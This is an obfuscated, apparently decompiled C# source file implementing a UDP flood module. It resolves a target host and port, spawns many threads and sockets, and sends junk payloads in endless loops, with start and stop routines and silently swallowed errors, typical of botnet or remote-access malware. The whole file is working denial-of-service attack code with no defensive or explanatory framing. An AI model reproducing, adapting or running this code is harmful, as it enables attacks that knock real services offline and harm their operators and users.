using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class BxgtTTuDPrLqOgGgrlEnKtF
{
	private class FJLDcFjUQEZPGUeNNzmNjwL
	{
		private Socket[] KKwxYhtWpUsLXLICURoYiok;

		private IPEndPoint wNOjluSzcsZfyHvcXXWbMFM;

		private int qRDTWZRpTxhdSmdUhraaOzb;

		private byte[] xKYGXJNnbYSkiFayFBNQeBC;

		public FJLDcFjUQEZPGUeNNzmNjwL(IPEndPoint LVQtJbvPJyenomrcVcHUTjm, int phHVOygiDfkxIdqeQrONoWn)
		{
			wNOjluSzcsZfyHvcXXWbMFM = LVQtJbvPJyenomrcVcHUTjm;
			qRDTWZRpTxhdSmdUhraaOzb = phHVOygiDfkxIdqeQrONoWn;
		}

		private static void ZdEepjCyVqQIEPgvRFOlgKM(IAsyncResult ar)
		{
		}

		public void Send()
		{
			checked
			{
				try
				{
					KKwxYhtWpUsLXLICURoYiok = new Socket[qRDTWZRpTxhdSmdUhraaOzb - 1 + 1];
					int num = qRDTWZRpTxhdSmdUhraaOzb - 1;
					int i;
					for (i = 0; i <= num; i++)
					{
						KKwxYhtWpUsLXLICURoYiok[i] = new Socket(wNOjluSzcsZfyHvcXXWbMFM.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
						KKwxYhtWpUsLXLICURoYiok[i].Blocking = false;
						KKwxYhtWpUsLXLICURoYiok[i].BeginConnect(wNOjluSzcsZfyHvcXXWbMFM, ZdEepjCyVqQIEPgvRFOlgKM, KKwxYhtWpUsLXLICURoYiok[i]);
					}
					Thread.Sleep(10);
					int num2 = qRDTWZRpTxhdSmdUhraaOzb - 1;
					i = 0;
					while (true)
					{
						if (i <= num2)
						{
							if (KKwxYhtWpUsLXLICURoYiok[i].Connected)
							{
								break;
							}
							i++;
							continue;
						}
						return;
					}
					if (TvBOLtHggIRdFZEcuUuGzSB == 2)
					{
						xKYGXJNnbYSkiFayFBNQeBC = Encoding.UTF8.GetBytes("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
					}
					else if (TvBOLtHggIRdFZEcuUuGzSB == 3)
					{
						xKYGXJNnbYSkiFayFBNQeBC = Encoding.UTF8.GetBytes("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
					}
					else
					{
						xKYGXJNnbYSkiFayFBNQeBC = Encoding.UTF8.GetBytes("~");
					}
					while (true)
					{
						Thread.Sleep(0);
						KKwxYhtWpUsLXLICURoYiok[i].Send(xKYGXJNnbYSkiFayFBNQeBC, SocketFlags.Partial);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static ThreadStart[] KHSjxGHQoiMOuBUcSxstrwh;

	private static Thread[] ovMnmDsumMoTRynIypEOwvj;

	private static IPEndPoint jLTfIbHfwJwuoHEaKVbXizB;

	private static FJLDcFjUQEZPGUeNNzmNjwL[] WXhFlPeLRksiOJKINxrycEo;

	public static string fuOiBvlRZaYdPIPtGFVZcTs;

	public static bool rKvzZNLFXUqNlrnyCRmnxHC;

	public static int IBkSVpSWkuPdQDdzybJaMQp;

	public static int epjCyVqQIEPgvRFOlgKMsMS;

	public static int aPuEFDIflsXkjzEGxXmePwy;

	public static short TvBOLtHggIRdFZEcuUuGzSB;

	public static void YISYUgwMTVeCwacJPiqfLHH()
	{
		try
		{
			IPAddress[] addressList = Dns.GetHostEntry(fuOiBvlRZaYdPIPtGFVZcTs).AddressList;
			jLTfIbHfwJwuoHEaKVbXizB = new IPEndPoint(addressList[0], IBkSVpSWkuPdQDdzybJaMQp);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			IPAddress address = IPAddress.Parse(fuOiBvlRZaYdPIPtGFVZcTs);
			jLTfIbHfwJwuoHEaKVbXizB = new IPEndPoint(address, IBkSVpSWkuPdQDdzybJaMQp);
			ProjectData.ClearProjectError();
		}
		checked
		{
			ovMnmDsumMoTRynIypEOwvj = new Thread[aPuEFDIflsXkjzEGxXmePwy - 1 + 1];
			KHSjxGHQoiMOuBUcSxstrwh = new ThreadStart[aPuEFDIflsXkjzEGxXmePwy - 1 + 1];
			WXhFlPeLRksiOJKINxrycEo = new FJLDcFjUQEZPGUeNNzmNjwL[aPuEFDIflsXkjzEGxXmePwy - 1 + 1];
			int num = aPuEFDIflsXkjzEGxXmePwy - 1;
			for (int i = 0; i <= num; i++)
			{
				WXhFlPeLRksiOJKINxrycEo[i] = new FJLDcFjUQEZPGUeNNzmNjwL(jLTfIbHfwJwuoHEaKVbXizB, epjCyVqQIEPgvRFOlgKMsMS);
				KHSjxGHQoiMOuBUcSxstrwh[i] = WXhFlPeLRksiOJKINxrycEo[i].Send;
				ovMnmDsumMoTRynIypEOwvj[i] = new Thread(KHSjxGHQoiMOuBUcSxstrwh[i]);
				ovMnmDsumMoTRynIypEOwvj[i].Start();
			}
			rKvzZNLFXUqNlrnyCRmnxHC = true;
		}
	}

	public static void GLvCKaBzQGJBZDhfNCWMDRb()
	{
		checked
		{
			int num = aPuEFDIflsXkjzEGxXmePwy - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					ovMnmDsumMoTRynIypEOwvj[i].Abort();
					ovMnmDsumMoTRynIypEOwvj[i] = null;
					KHSjxGHQoiMOuBUcSxstrwh[i] = null;
					WXhFlPeLRksiOJKINxrycEo[i] = null;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			rKvzZNLFXUqNlrnyCRmnxHC = false;
		}
	}
}
